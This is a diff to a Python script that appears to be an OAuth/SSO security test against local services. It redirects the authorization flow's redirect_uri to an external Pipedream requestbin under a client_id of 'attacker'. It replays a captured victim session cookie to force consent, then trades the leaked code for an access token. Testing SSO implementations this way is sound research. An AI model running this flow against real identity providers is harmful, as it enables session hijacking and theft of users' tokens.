@@ -32,21 +32,28 @@ page.locator('input[type="submit"]').click()
     """
     bs.run(sso_flow)
 
+    # get session cookie
+    traces = osbt.proxy.get_history()
+    cookie = traces['request'][len(traces['request'])-1]['headers']['Cookie']
+    print('cookie:', cookie)
+
     osbt.proxy.clean() # clean proxy rules
 
     # add modify rule
     osbt.proxy.modify_query_param('redirect_uri', PIPEDREAM_URL + '/callback', 'localhost:3001', '/authorize', 'GET')
     osbt.proxy.modify_query_param('client_id', 'attacker', 'localhost:3001', '/authorize', 'GET')
 
-    sso_flow = f"""
-page.locator('input[name="userId"]').fill('{victim_username}')
-page.locator('input[name="password"]').fill('{victim_password}')
-page.locator('input[type="submit"]').click()
-page.locator('input[type="submit"][value="Yes"]').click()
-    """
-    bs.run(sso_flow)
+    bs.visit(f'{HONEST_RP_ENDPOINT}/login')
 
     osbt.proxy.clean() # clean proxy rules
+
+    # conset post
+    response = requests.post(
+        f'{HONEST_OP_ENDPOINT}/consent',
+        data={'consent': 'Yes'},
+        headers={'Cookie': cookie}
+    )
+    print('consent response:', response.text)
 
     # check requestbin history
     history = osbt.requestbin.get_requestbin_history(PIPEDREAM_TOKEN, PIPEDREAM_SOURCE_ID)
@@ -62,10 +69,8 @@ page.locator('input[type="submit"][value="Yes"]').click()
         'client_id': 'attacker',
         'client_secret': 'secret'
     })
-    print('access_token:', response.json().get('access_token'))
-    print('id_token:', response.json().get('id_token'))
+    print(response.json())
     assert(response.json().get('access_token') != None)
-    assert(response.json().get('id_token') != None)
 
 except Exception as e:
     print('Error:', e)
